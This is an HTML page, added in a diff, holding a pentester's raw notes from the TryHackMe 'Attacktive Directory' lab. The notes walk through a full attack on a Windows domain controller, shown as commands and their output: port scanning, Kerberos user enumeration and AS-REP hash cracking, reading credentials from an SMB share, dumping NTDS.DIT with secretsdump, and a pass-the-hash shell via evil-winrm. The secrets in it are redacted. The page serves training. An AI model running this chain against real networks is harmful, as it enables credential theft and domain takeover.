@@ -1,0 +1,578 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Attacktive Directory Raw Notes — Manthan Bhatt</title>
+<meta name="description" content="Unedited engagement notes from the TryHackMe Attacktive Directory room.">
+<link rel="icon" href="/favicon.svg">
+<script>try{var t=localStorage.getItem('theme');if(t==='dark'||(!t&&matchMedia('(prefers-color-scheme: dark)').matches))document.documentElement.classList.add('dark')}catch(e){}</script>
+<link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Serif:wght@600&family=IBM+Plex+Sans:wght@400;600&family=IBM+Plex+Mono:wght@400;500&display=swap" rel="stylesheet">
+<style>
+:root{--paper:#F5F4F0;--paper-dim:#ECEAE3;--ink:#14151A;--ink-soft:#4A4A47;--line:#C9C7BE;--stamp:#9C2B2B;--accent-muted:#6B6455}
+:root.dark{--paper:#1A1A18;--paper-dim:#232320;--ink:#EDEBE4;--ink-soft:#A8A69C;--line:#3A3935;--stamp:#D4645F;--accent-muted:#8C8778}
+*{box-sizing:border-box}body{margin:0;background:var(--paper);color:var(--ink);font-family:'IBM Plex Sans',sans-serif;line-height:1.6}
+.wrap{max-width:920px;margin:0 auto;padding:0 24px 64px}
+.top{display:flex;justify-content:space-between;padding:20px 0;border-bottom:1px solid var(--line);font-family:'IBM Plex Mono',monospace;font-size:12px;letter-spacing:.08em;text-transform:uppercase}
+.top a{color:var(--ink-soft);text-decoration:none}.top a:hover{color:var(--ink)}
+.banner{border-left:2px solid var(--stamp);background:var(--paper-dim);padding:14px 18px;margin:28px 0;font-size:14.5px;color:var(--ink-soft)}
+.banner b{font-family:'IBM Plex Mono',monospace;font-size:11px;letter-spacing:.1em;text-transform:uppercase;color:var(--stamp);display:block;margin-bottom:4px;font-weight:500}
+#out h1,#out h2{font-family:'IBM Plex Serif',serif;font-weight:600;border-top:1px solid var(--line);padding-top:22px;margin-top:36px}
+#out h3,#out h4{font-family:'IBM Plex Mono',monospace;font-size:14px;letter-spacing:.04em;margin-top:26px}
+#out p,#out li{color:var(--ink-soft);font-size:15px}
+#out code{font-family:'IBM Plex Mono',monospace;font-size:12.5px;background:var(--paper-dim);padding:1px 4px}
+#out pre{background:var(--paper-dim);border:1px solid var(--line);padding:12px 14px;overflow-x:auto;font-size:12px;line-height:1.5}
+#out pre code{background:none;padding:0}
+#out img{max-width:100%;border:1px solid var(--line);display:block;margin:14px 0}
+#out table{border-collapse:collapse;font-size:13.5px}#out td,#out th{border:1px solid var(--line);padding:6px 8px}
+</style></head><body><div class="wrap">
+<nav class="top"><a href="./">← Attacktive Directory case file</a><a href="/#writeups">Case files</a></nav>
+<div class="banner"><b>Raw notes</b>These are my unedited notes, written live during the engagement. Passwords, hashes, keys and flags are redacted. The case file was written with the help of AI from these notes.</div>
+<div id="out"></div></div>
+<script type="text/markdown" id="md">
+# Target
+- Box / room: [Attacktive Directory](https://tryhackme.com/room/attacktivedirectory)
+- IP / vhost: 10.48.187.180
+- Difficulty: Medium
+
+# Recon
+### Rustscan
+```bash
+[manthan@manthanbhatt ~]$ rustscan -a 10.48.187.180 -- -sC -sV -A
+.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
+| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
+| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
+`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
+The Modern Day Port Scanner.
+________________________________________
+: http://discord.skerritt.blog         :
+: https://github.com/RustScan/RustScan :
+ --------------------------------------
+Port scanning: Making networking exciting since... whenever.
+
+[~] The config file is expected to be at "/home/manthan/.rustscan.toml"
+[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
+[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
+Open 10.48.187.180:53
+Open 10.48.187.180:80
+Open 10.48.187.180:88
+Open 10.48.187.180:135
+Open 10.48.187.180:139
+Open 10.48.187.180:389
+Open 10.48.187.180:445
+Open 10.48.187.180:464
+Open 10.48.187.180:593
+Open 10.48.187.180:636
+Open 10.48.187.180:3269
+Open 10.48.187.180:3268
+Open 10.48.187.180:3389
+Open 10.48.187.180:5985
+Open 10.48.187.180:9389
+Open 10.48.187.180:47001
+Open 10.48.187.180:49666
+Open 10.48.187.180:49665
+Open 10.48.187.180:49668
+Open 10.48.187.180:49664
+Open 10.48.187.180:49669
+Open 10.48.187.180:49678
+Open 10.48.187.180:49673
+Open 10.48.187.180:49695
+Open 10.48.187.180:49670
+Open 10.48.187.180:49681
+Open 10.48.187.180:49702
+[~] Starting Script(s)
+[>] Running script "nmap -vvv -p {{port}} -{{ipversion}} {{ip}} -sC -sV -A" on ip 10.48.187.180
+Depending on the complexity of the script, results may take some time to appear.
+[~] Starting Nmap 7.993 ( https://nmap.org ) at 2026-11-07 14:00 +0530
+NSE: Loaded 159 scripts for scanning.
+NSE: Script Pre-scanning.
+NSE: Starting runlevel 1 (of 3) scan.
+Initiating NSE at 14:00
+Completed NSE at 14:00, 0.00s elapsed
+NSE: Starting runlevel 2 (of 3) scan.
+Initiating NSE at 14:00
+Completed NSE at 14:00, 0.00s elapsed
+NSE: Starting runlevel 3 (of 3) scan.
+Initiating NSE at 14:00
+Completed NSE at 14:00, 0.00s elapsed
+Initiating Ping Scan at 14:00
+Scanning 10.48.187.180 [2 ports]
+Completed Ping Scan at 14:00, 0.05s elapsed (1 total hosts)
+mass_dns: Using DNS server 10.158.79.20
+mass_dns: Using DNS server 2409:40c1:2033:9de5::62
+Initiating Parallel DNS resolution of 1 host. at 14:00
+mass_dns: 1/1 [#: 2, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, SY: 0]
+Completed Parallel DNS resolution of 1 host. at 14:00, 0.50s elapsed
+Initiating Connect Scan at 14:00
+Scanning 10.48.187.180 [27 ports]
+Discovered open port 135/tcp on 10.48.187.180
+Discovered open port 53/tcp on 10.48.187.180
+Discovered open port 49664/tcp on 10.48.187.180
+Discovered open port 139/tcp on 10.48.187.180
+Discovered open port 3389/tcp on 10.48.187.180
+Discovered open port 80/tcp on 10.48.187.180
+Discovered open port 445/tcp on 10.48.187.180
+Discovered open port 49681/tcp on 10.48.187.180
+Discovered open port 49702/tcp on 10.48.187.180
+Discovered open port 593/tcp on 10.48.187.180
+Discovered open port 49668/tcp on 10.48.187.180
+Discovered open port 49669/tcp on 10.48.187.180
+Discovered open port 636/tcp on 10.48.187.180
+Discovered open port 389/tcp on 10.48.187.180
+Discovered open port 47001/tcp on 10.48.187.180
+Discovered open port 3269/tcp on 10.48.187.180
+Discovered open port 49665/tcp on 10.48.187.180
+Discovered open port 49666/tcp on 10.48.187.180
+Discovered open port 49673/tcp on 10.48.187.180
+Discovered open port 5985/tcp on 10.48.187.180
+Discovered open port 49678/tcp on 10.48.187.180
+Discovered open port 49670/tcp on 10.48.187.180
+Discovered open port 9389/tcp on 10.48.187.180
+Discovered open port 49695/tcp on 10.48.187.180
+Discovered open port 464/tcp on 10.48.187.180
+Discovered open port 88/tcp on 10.48.187.180
+Discovered open port 3268/tcp on 10.48.187.180
+Completed Connect Scan at 14:00, 0.12s elapsed (27 total ports)
+Initiating Service scan at 14:00
+Scanning 27 services on 10.48.187.180
+Completed Service scan at 14:01, 60.73s elapsed (27 services on 1 host)
+NSE: Script scanning 10.48.187.180.
+NSE: Starting runlevel 1 (of 3) scan.
+Initiating NSE at 14:01
+Completed NSE at 14:01, 8.34s elapsed
+NSE: Starting runlevel 2 (of 3) scan.
+Initiating NSE at 14:01
+Completed NSE at 14:01, 3.08s elapsed
+NSE: Starting runlevel 3 (of 3) scan.
+Initiating NSE at 14:01
+Completed NSE at 14:01, 0.00s elapsed
+Nmap scan report for 10.48.187.180
+Host is up, received syn-ack (0.068s latency).
+Scanned at 2026-11-07 14:00:03 IST for 72s
+
+PORT      STATE SERVICE       REASON  VERSION
+53/tcp    open  domain        syn-ack Simple DNS Plus
+80/tcp    open  http          syn-ack Microsoft IIS httpd 10.0
+| http-methods: 
+|   Supported Methods: OPTIONS TRACE GET HEAD POST
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: IIS Windows Server
+88/tcp    open  kerberos-sec  syn-ack Microsoft Windows Kerberos (server time: 2026-11-07 08:30:35Z)
+135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
+139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
+389/tcp   open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: spookysec.local, Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds? syn-ack
+464/tcp   open  kpasswd5?     syn-ack
+593/tcp   open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped    syn-ack
+3268/tcp  open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: spookysec.local, Site: Default-First-Site-Name)
+3269/tcp  open  tcpwrapped    syn-ack
+3389/tcp  open  ms-wbt-server syn-ack Microsoft Terminal Services
+|_ssl-date: 2026-11-07T08:31:38+00:00; +26s from scanner time.
+| ssl-cert: Subject: commonName=AttacktiveDirectory.spookysec.local
+| Issuer: commonName=AttacktiveDirectory.spookysec.local
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2026-11-06T08:28:05
+| Not valid after:  2027-05-08T08:28:05
+| MD5:     e421 95cb ad36 5100 1301 fc1c e20d 9672
+| SHA-1:   e6c9 273f bc2e f199 0541 edd9 b724 3d65 7e1a 92d6
+| SHA-256: 283f db74 d7d4 5f60 3424 8a4e 03a2 09af 25b0 42e9 61a5 dfd9 3579 b009 8e72 3fba
+| -----BEGIN CERTIFICATE-----
+| MIIDCjCCAfKgAwIBAgIQFN0eBjBN0ZJIjaUgrfuRnzANBgkqhkiG9w0BAQsFADAu
+| MSwwKgYDVQQDEyNBdHRhY2t0aXZlRGlyZWN0b3J5LnNwb29reXNlYy5sb2NhbDAe
+| Fw0yNjExMDYwODI4MDVaFw0yNzA1MDgwODI4MDVaMC4xLDAqBgNVBAMTI0F0dGFj
+| a3RpdmVEaXJlY3Rvcnkuc3Bvb2t5c2VjLmxvY2FsMIIBIjANBgkqhkiG9w0BAQEF
+| AAOCAQ8AMIIBCgKCAQEA1EExhFkDhf4hEXtWQWjis6tQ/wP4Z+rBLVfYOoJvLcMb
+| u98hrGBMoFnqFQr4sga8q5uSSzuM0OvuBdPgk9A0foQX+HrtGOiafcRyRxNWmQPI
+| gpRhccoSz5DUY+8FdQR1nZ7D9wsp4Sgm32bNNtV6DHGrtsZ9SD1c09NpKuKJl1GD
+| K4b/fp2SDD4yEMqJrVK6ZHab7rLLaWyZgd2qrkTNVPqXImqxq+YThsjFYhDGyPUN
+| bRZ4bfhkcYJ8UOPkZ+G0d0Y++6F3x3sLS/FxuroGS4k46/ek8PGXagGcEo8Hd/9W
+| 4w6yfUYUjg7Y7BzZiXMBV8XXB/7VrfKQsk3uhp0YXQIDAQABoyQwIjATBgNVHSUE
+| DDAKBggrBgEFBQcDATALBgNVHQ8EBAMCBDAwDQYJKoZIhvcNAQELBQADggEBAMB4
+| wrz2k10ezdrjbulxRyoF9IXtIZpqYclKLsFBDYSAsZOieBDO+Wems+qXGUmaiVub
+| BfilmBimbK7ghClXG0pVUneD6GZsKQMd3CaLkSTD06LhNShjXa+cVvdELWA0jyjc
+| Eu5sTvXJG4KKRzok4ZA4I+escoHBURTBsSTHD+A05oaBz8gkbk2K6F7vpfdEkn9m
+| VOVrgBtRtZBMYnBWwkrFuzXoz3Bn/P/6vYsmWiShAdBfSd0HKNuTgdS7gk7s34Eo
+| RI+cgoBduneLDXUsgorWF0roxWCd4oG730eb4IXifp42U8Pn/7+OM+gBNwm5a95p
+| nyh8QTQ0XzALy2A/4v8=
+|_-----END CERTIFICATE-----
+5985/tcp  open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+9389/tcp  open  mc-nmf        syn-ack .NET Message Framing
+47001/tcp open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+49664/tcp open  msrpc         syn-ack Microsoft Windows RPC
+49665/tcp open  msrpc         syn-ack Microsoft Windows RPC
+49666/tcp open  msrpc         syn-ack Microsoft Windows RPC
+49668/tcp open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
+49669/tcp open  msrpc         syn-ack Microsoft Windows RPC
+49670/tcp open  msrpc         syn-ack Microsoft Windows RPC
+49673/tcp open  msrpc         syn-ack Microsoft Windows RPC
+49678/tcp open  msrpc         syn-ack Microsoft Windows RPC
+49681/tcp open  msrpc         syn-ack Microsoft Windows RPC
+49695/tcp open  msrpc         syn-ack Microsoft Windows RPC
+49702/tcp open  msrpc         syn-ack Microsoft Windows RPC
+Service Info: Host: ATTACKTIVEDIREC; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| p2p-conficker: 
+|   Checking for Conficker.C or higher...
+|   Check 1 (port 64361/tcp): CLEAN (Couldn't establish connection (ERROR))
+|   Check 2 (port 11458/tcp): CLEAN (Couldn't establish connection (ERROR))
+|   Check 3 (port 13119/udp): CLEAN (Couldn't receive bytes: TIMEOUT)
+|   Check 4 (port 59425/udp): CLEAN (Couldn't receive bytes: ERROR)
+|_  0/4 checks are positive: Host is CLEAN or ports are blocked
+| smb2-time: 
+|   date: 2026-11-07T08:31:31
+|_  start_date: N/A
+|_clock-skew: mean: 25s, deviation: 0s, median: 25s
+| smb2-security-mode: 
+|   3.1.1: 
+|_    Message signing enabled and required
+
+NSE: Script Post-scanning.
+NSE: Starting runlevel 1 (of 3) scan.
+Initiating NSE at 14:01
+Completed NSE at 14:01, 0.00s elapsed
+NSE: Starting runlevel 2 (of 3) scan.
+Initiating NSE at 14:01
+Completed NSE at 14:01, 0.00s elapsed
+NSE: Starting runlevel 3 (of 3) scan.
+Initiating NSE at 14:01
+Completed NSE at 14:01, 0.00s elapsed
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 73.04 seconds
+
+[manthan@manthanbhatt ~]$ 
+```
+
+```bash
+enum4linux 10.48.187.180
+```
+![](img/enum4linux-domain.png)
+
+```
+Domain: spookysec.local
+DC: AttacktiveDirectory.spookysec.local
+```
+
+## Q&A for `Task 3`
+
+```
+1. What tool will allow us to enumerate port 139/445?
+   enum4linux
+2. What is the NetBIOS-Domain Name of the machine?
+   THM-AD
+3. What invalid TLD do people commonly use for their Active Directory Domain?
+   .local
+```
+
+## User enum
+```bash
+[manthan@manthanbhatt Attacktive_Directory]$ kerbrute userenum -d spookysec.local --dc AttacktiveDirectory.spookysec.local ./users.txt
+
+    __             __               __     
+   / /_____  _____/ /_  _______  __/ /____ 
+  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
+ / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
+/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        
+
+Version: dev (n/a) - 11/07/26 - Ronnie Flathers @ropnop
+
+2026/11/07 14:16:04 >  Using KDC(s):
+2026/11/07 14:16:04 >  	AttacktiveDirectory.spookysec.local:88
+
+2026/11/07 14:16:05 >  [+] VALID USERNAME:	james@spookysec.local
+2026/11/07 14:16:06 >  [+] svc-admin has no pre auth required. Dumping hash to crack offline:
+$krb5asrep$23$[REDACTED]
+2026/11/07 14:16:06 >  [+] VALID USERNAME:	svc-admin@spookysec.local
+2026/11/07 14:16:08 >  [+] VALID USERNAME:	James@spookysec.local
+2026/11/07 14:16:09 >  [+] VALID USERNAME:	robin@spookysec.local
+2026/11/07 14:16:14 >  [+] VALID USERNAME:	darkstar@spookysec.local
+2026/11/07 14:16:17 >  [+] VALID USERNAME:	administrator@spookysec.local
+2026/11/07 14:16:24 >  [+] VALID USERNAME:	backup@spookysec.local
+2026/11/07 14:16:28 >  [+] VALID USERNAME:	paradox@spookysec.local
+2026/11/07 14:16:53 >  [+] VALID USERNAME:	JAMES@spookysec.local
+2026/11/07 14:17:02 >  [+] VALID USERNAME:	Robin@spookysec.local
+2026/11/07 14:17:54 >  [+] VALID USERNAME:	Administrator@spookysec.local
+2026/11/07 14:19:15 >  [!] Money@spookysec.local - failed to communicate with KDC. Attempts made with UDP (error sending to a KDC: error sneding to AttacktiveDirectory.spookysec.local:88: sending over UDP failed to 10.48.187.180:88: read udp 192.168.165.74:58728->10.48.187.180:88: i/o timeout) and then TCP (error in getting a TCP connection to any of the KDCs)
+2026/11/07 14:19:15 >  [!] Music@spookysec.local - failed to communicate with KDC. Attempts made with UDP (error sending to a KDC: error sneding to AttacktiveDirectory.spookysec.local:88: sending over UDP failed to 10.48.187.180:88: read udp 192.168.165.74:60303->10.48.187.180:88: i/o timeout) and then TCP (error in getting a TCP connection to any of the KDCs)
+2026/11/07 14:19:15 >  [!] Montreal@spookysec.local - failed to communicate with KDC. Attempts made with UDP (error sending to a KDC: error sneding to AttacktiveDirectory.spookysec.local:88: sending over UDP failed to 10.48.187.180:88: read udp 192.168.165.74:38222->10.48.187.180:88: i/o timeout) and then TCP (error in getting a TCP connection to any of the KDCs)
+2026/11/07 14:19:19 >  Done! Tested 23105 usernames (11 valid) in 194.426 seconds
+[manthan@manthanbhatt Attacktive_Directory]$ 
+```
+
+#### Hash:
+```
+$krb5asrep$23$[REDACTED]
+```
+
+#### Usernames:
+```
+james@spookysec.local
+svc-admin@spookysec.local
+James@spookysec.local
+robin@spookysec.local
+darkstar@spookysec.local
+administrator@spookysec.local
+backup@spookysec.local
+paradox@spookysec.local
+JAMES@spookysec.local
+Robin@spookysec.local
+Administrator@spookysec.local
+```
+### Q&A for `Task 4`
+```
+1. What command within Kerbrute will allow us to enumerate valid usernames?
+   userenum
+2. What notable account is discovered? (These should jump out at you)
+   svc-admin
+3. What is the other notable account is discovered? (These should jump out at you)
+   backup
+```
+
+### Hash Cracking:
+```bash
+[manthan@manthanbhatt Attacktive_Directory]$ echo '$krb5asrep$23$[REDACTED]' > hash.txt
+[manthan@manthanbhatt Attacktive_Directory]$ hashcat -m 18200 hash.txt passwordlist.txt -o crack_hash.txt
+[manthan@manthanbhatt Attacktive_Directory]$ cat crack_hash.txt 
+$krb5asrep$23$[REDACTED]:[REDACTED]
+[manthan@manthanbhatt Attacktive_Directory]$ 
+```
+### Q&A for `Task 5`
+```
+1. We have two user accounts that we could potentially query a ticket from. Which user account can you query a ticket from with no password?
+   svc-admin
+2. Looking at the Hashcat Examples Wiki page, what type of Kerberos hash did we retrieve from the KDC? (Specify the full name)
+   Kerberos 5 AS-REP etype 18
+3. What mode is the hash?
+   18200 ()
+4. Now crack the hash with the modified password list provided, what is the user accounts password?
+   [REDACTED]
+```
+
+### Creds:
+```
+svc-admin:[REDACTED]
+```
+
+```bash
+[manthan@manthanbhatt Attacktive_Directory]$ smbclient -L //spookysec.local -U svc-admin%[REDACTED]
+Can't load /etc/samba/smb.conf - run testparm to debug it
+
+	Sharename       Type      Comment
+	---------       ----      -------
+	ADMIN$          Disk      Remote Admin
+	backup          Disk      
+	C$              Disk      Default share
+	IPC$            IPC       Remote IPC
+	NETLOGON        Disk      Logon server share 
+	SYSVOL          Disk      Logon server share 
+SMB1 disabled -- no workgroup available
+[manthan@manthanbhatt Attacktive_Directory]$ 
+```
+
+```bash
+[manthan@manthanbhatt Attacktive_Directory]$ smbclient //spookysec.local/backup -U svc-admin%[REDACTED]
+Can't load /etc/samba/smb.conf - run testparm to debug it
+Try "help" to get a list of possible commands.
+smb: \> ls
+  .                                   D        0  Sun Apr  5 00:38:39 2020
+  ..                                  D        0  Sun Apr  5 00:38:39 2020
+  backup_credentials.txt              A       48  Sun Apr  5 00:38:53 2020
+
+		8247551 blocks of size 4096. 3891174 blocks available
+smb: \> get backup_credentials.txt 
+getting file \backup_credentials.txt of size 48 as backup_credentials.txt (0.2 KiloBytes/sec) (average 0.2 KiloBytes/sec)
+smb: \> 
+```
+
+```bash
+[manthan@manthanbhatt Attacktive_Directory]$ cat backup_credentials.txt 
+[REDACTED]
+[manthan@manthanbhatt Attacktive_Directory]$ echo '[REDACTED]' | base64 -d
+backup@spookysec.local:[REDACTED]
+[manthan@manthanbhatt Attacktive_Directory]$ 
+```
+#### Q&A for `Task 6`
+```
+1. What utility can we use to map remote SMB shares?
+   smbclient
+2. Which option will list shares?
+   -L
+3. How many remote shares is the server listing?
+   6
+4. There is one particular share that we have access to that contains a text file. Which share is it?
+   backup
+5. What is the content of the file?
+   [REDACTED]
+6. Decoding the contents of the file, what is the full contents?
+   backup@spookysec.local:[REDACTED]
+```
+
+```bash
+[manthan@manthanbhatt Attacktive_Directory]$ secretsdump.py spookysec.local/backup:[REDACTED]@10.48.149.29
+Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 
+
+[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:[REDACTED]:[REDACTED]:::
+Guest:501:[REDACTED]:[REDACTED]:::
+krbtgt:502:[REDACTED]:[REDACTED]:::
+spookysec.local\skidy:1103:[REDACTED]:[REDACTED]:::
+spookysec.local\breakerofthings:1104:[REDACTED]:[REDACTED]:::
+spookysec.local\james:1105:[REDACTED]:[REDACTED]:::
+spookysec.local\optional:1106:[REDACTED]:[REDACTED]:::
+spookysec.local\sherlocksec:1107:[REDACTED]:[REDACTED]:::
+spookysec.local\darkstar:1108:[REDACTED]:[REDACTED]:::
+spookysec.local\Ori:1109:[REDACTED]:[REDACTED]:::
+spookysec.local\robin:1110:[REDACTED]:[REDACTED]:::
+spookysec.local\paradox:1111:[REDACTED]:[REDACTED]:::
+spookysec.local\Muirland:1112:[REDACTED]:[REDACTED]:::
+spookysec.local\horshark:1113:[REDACTED]:[REDACTED]:::
+spookysec.local\svc-admin:1114:[REDACTED]:[REDACTED]:::
+spookysec.local\backup:1118:[REDACTED]:[REDACTED]:::
+spookysec.local\a-spooks:1601:[REDACTED]:[REDACTED]:::
+ATTACKTIVEDIREC$:1000:[REDACTED]:[REDACTED]:::
+[*] Kerberos keys grabbed
+Administrator:aes256-cts-hmac-sha1-96:[REDACTED]
+Administrator:aes128-cts-hmac-sha1-96:[REDACTED]
+Administrator:des-cbc-md5:[REDACTED]
+krbtgt:aes256-cts-hmac-sha1-96:[REDACTED]
+krbtgt:aes128-cts-hmac-sha1-96:[REDACTED]
+krbtgt:des-cbc-md5:[REDACTED]
+spookysec.local\skidy:aes256-cts-hmac-sha1-96:[REDACTED]
+spookysec.local\skidy:aes128-cts-hmac-sha1-96:[REDACTED]
+spookysec.local\skidy:des-cbc-md5:[REDACTED]
+spookysec.local\breakerofthings:aes256-cts-hmac-sha1-96:[REDACTED]
+spookysec.local\breakerofthings:aes128-cts-hmac-sha1-96:[REDACTED]
+spookysec.local\breakerofthings:des-cbc-md5:[REDACTED]
+spookysec.local\james:aes256-cts-hmac-sha1-96:[REDACTED]
+spookysec.local\james:aes128-cts-hmac-sha1-96:[REDACTED]
+spookysec.local\james:des-cbc-md5:[REDACTED]
+spookysec.local\optional:aes256-cts-hmac-sha1-96:[REDACTED]
+spookysec.local\optional:aes128-cts-hmac-sha1-96:[REDACTED]
+spookysec.local\optional:des-cbc-md5:[REDACTED]
+spookysec.local\sherlocksec:aes256-cts-hmac-sha1-96:[REDACTED]
+spookysec.local\sherlocksec:aes128-cts-hmac-sha1-96:[REDACTED]
+spookysec.local\sherlocksec:des-cbc-md5:[REDACTED]
+spookysec.local\darkstar:aes256-cts-hmac-sha1-96:[REDACTED]
+spookysec.local\darkstar:aes128-cts-hmac-sha1-96:[REDACTED]
+spookysec.local\darkstar:des-cbc-md5:[REDACTED]
+spookysec.local\Ori:aes256-cts-hmac-sha1-96:[REDACTED]
+spookysec.local\Ori:aes128-cts-hmac-sha1-96:[REDACTED]
+spookysec.local\Ori:des-cbc-md5:[REDACTED]
+spookysec.local\robin:aes256-cts-hmac-sha1-96:[REDACTED]
+spookysec.local\robin:aes128-cts-hmac-sha1-96:[REDACTED]
+spookysec.local\robin:des-cbc-md5:[REDACTED]
+spookysec.local\paradox:aes256-cts-hmac-sha1-96:[REDACTED]
+spookysec.local\paradox:aes128-cts-hmac-sha1-96:[REDACTED]
+spookysec.local\paradox:des-cbc-md5:[REDACTED]
+spookysec.local\Muirland:aes256-cts-hmac-sha1-96:[REDACTED]
+spookysec.local\Muirland:aes128-cts-hmac-sha1-96:[REDACTED]
+spookysec.local\Muirland:des-cbc-md5:[REDACTED]
+spookysec.local\horshark:aes256-cts-hmac-sha1-96:[REDACTED]
+spookysec.local\horshark:aes128-cts-hmac-sha1-96:[REDACTED]
+spookysec.local\horshark:des-cbc-md5:[REDACTED]
+spookysec.local\svc-admin:aes256-cts-hmac-sha1-96:[REDACTED]
+spookysec.local\svc-admin:aes128-cts-hmac-sha1-96:[REDACTED]
+spookysec.local\svc-admin:des-cbc-md5:[REDACTED]
+spookysec.local\backup:aes256-cts-hmac-sha1-96:[REDACTED]
+spookysec.local\backup:aes128-cts-hmac-sha1-96:[REDACTED]
+spookysec.local\backup:des-cbc-md5:[REDACTED]
+spookysec.local\a-spooks:aes256-cts-hmac-sha1-96:[REDACTED]
+spookysec.local\a-spooks:aes128-cts-hmac-sha1-96:[REDACTED]
+spookysec.local\a-spooks:des-cbc-md5:[REDACTED]
+ATTACKTIVEDIREC$:aes256-cts-hmac-sha1-96:[REDACTED]
+ATTACKTIVEDIREC$:aes128-cts-hmac-sha1-96:[REDACTED]
+ATTACKTIVEDIREC$:des-cbc-md5:[REDACTED]
+[*] Cleaning up... 
+[manthan@manthanbhatt Attacktive_Directory]$ 
+```
+
+**Just NTLM Hashes**
+```bash
+[manthan@manthanbhatt Attacktive_Directory]$ secretsdump.py -just-dc-ntlm spookysec.local/backup:[REDACTED]@10.48.149.29
+Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:[REDACTED]:[REDACTED]:::
+Guest:501:[REDACTED]:[REDACTED]:::
+krbtgt:502:[REDACTED]:[REDACTED]:::
+spookysec.local\skidy:1103:[REDACTED]:[REDACTED]:::
+spookysec.local\breakerofthings:1104:[REDACTED]:[REDACTED]:::
+spookysec.local\james:1105:[REDACTED]:[REDACTED]:::
+spookysec.local\optional:1106:[REDACTED]:[REDACTED]:::
+spookysec.local\sherlocksec:1107:[REDACTED]:[REDACTED]:::
+spookysec.local\darkstar:1108:[REDACTED]:[REDACTED]:::
+spookysec.local\Ori:1109:[REDACTED]:[REDACTED]:::
+spookysec.local\robin:1110:[REDACTED]:[REDACTED]:::
+spookysec.local\paradox:1111:[REDACTED]:[REDACTED]:::
+spookysec.local\Muirland:1112:[REDACTED]:[REDACTED]:::
+spookysec.local\horshark:1113:[REDACTED]:[REDACTED]:::
+spookysec.local\svc-admin:1114:[REDACTED]:[REDACTED]:::
+spookysec.local\backup:1118:[REDACTED]:[REDACTED]:::
+spookysec.local\a-spooks:1601:[REDACTED]:[REDACTED]:::
+ATTACKTIVEDIREC$:1000:[REDACTED]:[REDACTED]:::
+[*] Cleaning up... 
+[manthan@manthanbhatt Attacktive_Directory]$ 
+```
+### Q&A for `Task 7`
+```
+1. What method allowed us to dump NTDS.DIT?
+   DRSUAPI
+2. What is the Administrators NTLM hash?
+   [REDACTED]
+3. What method of attack could allow us to authenticate as the user without the password?
+   Pass The Hash
+4. Using a tool called Evil-WinRM what option will allow us to use a hash?
+   -H
+```
+
+```bash
+[manthan@manthanbhatt Attacktive_Directory]$ evil-winrm -i 10.48.149.29 -u Administrator -H [REDACTED]
+
+```
+
+```bash
+*Evil-WinRM* PS C:\Users\Administrator> cd "C:/Users/Administrator/Desktop/"
+*Evil-WinRM* PS C:\Users\Administrator\Desktop> dir
+
+
+    Directory: C:\Users\Administrator\Desktop
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----         4/4/2020  11:39 AM             32 root.txt
+
+
+*Evil-WinRM* PS C:\Users\Administrator\Desktop> download root.txt
+
+*Evil-WinRM* PS C:\Users\svc-admin\Desktop> download "C:/Users/svc-admin/Desktop/user.txt.txt"
+
+*Evil-WinRM* PS C:\Users\backup\Desktop> download "C:/Users/backup/Desktop/PrivEsc.txt"
+```
+
+```bash
+[manthan@manthanbhatt Attacktive_Directory]$ evil-winrm -i 10.48.149.29 -u Administrator -H [REDACTED]
+```
+
+### Q&A for `Task 8`
+```
+1. svc-admin
+   TryHackMe{REDACTED}
+2. backup
+   TryHackMe{REDACTED}
+3. Administrator
+   TryHackMe{REDACTED}
+```
+</script>
+<script src="https://cdn.jsdelivr.net/npm/marked@12.0.2/marked.min.js"></script>
+<script>document.getElementById("out").innerHTML=marked.parse(document.getElementById("md").textContent);</script>
+</body></html>
